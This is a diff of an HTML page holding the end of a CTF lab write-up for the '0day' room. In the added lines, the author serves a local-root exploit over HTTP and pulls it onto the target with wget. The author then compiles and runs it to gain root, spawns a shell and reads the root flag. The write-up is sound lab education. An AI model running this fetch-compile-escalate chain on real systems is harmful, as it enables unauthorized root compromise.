-<pre><code>www-data<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/dev/shm</span><span class="hljs-variable">$ </span>gcc <span class="hljs-number">37292</span>.c -o exploit
-gcc <span class="hljs-number">37292</span>.c -o exploit
-www-data<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/dev/shm</span><span class="hljs-variable">$ </span>chmod +x exploit
+<pre><code>python3 -m http.server 7000
+</code></pre>
+<p>Then we go to the /dev/shm directory in the target because it is writable for everyone and we use this command to get our exploit:</p>
+<pre><code>wget http://10.17.51.16:7000/37292.c
+</code></pre>
+<p>Then we compile it and run it with this commands:</p>
+<pre><code>www-data@ubuntu:/dev/shm$ gcc 37292.c -o exploit
+gcc 37292.c -o exploit
+www-data@ubuntu:/dev/shm$ chmod +x exploit
 chmod +x exploit
-www-data<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/dev/shm</span><span class="hljs-variable">$ </span>./exploit
+www-data@ubuntu:/dev/shm$ ./exploit
 ./exploit
 spawning threads
-mount <span class="hljs-comment">#1</span>
-mount <span class="hljs-comment">#2</span>
+mount #1
+mount #2
 child threads done
 /etc/ld.so.preload created
 creating shared library
-<span class="hljs-comment"># whoami</span>
+# whoami
 whoami
 root
-<span class="hljs-comment"># python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
-python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
-root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/run/shm</span><span class="hljs-comment">#</span>
-</code></pre><p>It worked, we are root so we get our root flag:</p>
-<pre><code>root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/run/shm</span><span class="hljs-comment"># cat /root/root.txt</span>
+# python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+root@ubuntu:/run/shm#
+</code></pre>
+<p>It worked, we are root so we get our root flag:</p>
+<pre><code>root@ubuntu:/run/shm# cat /root/root.txt
 cat root.txt
 THM{g00d_j0b_0day_is_Pleased}
-</code></pre><p>And thats it, 0day pwned. I hope you enjoy this write up . Thanks for reading!</p>
+</code></pre>
+<p>And thats it, 0day pwned. I hope you enjoy this write up . Thanks for reading!</p>
 
-<script>
-        document.querySelectorAll('.copy-btn').forEach(button => {
-            button.addEventListener('click', () => {
-                const codeBlock = button.parentElement.querySelector('code');
-                const textArea = document.createElement('textarea');
-                textArea.value = codeBlock.textContent;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-            });
-        });
-    </script>
 </body>
 </html>
-
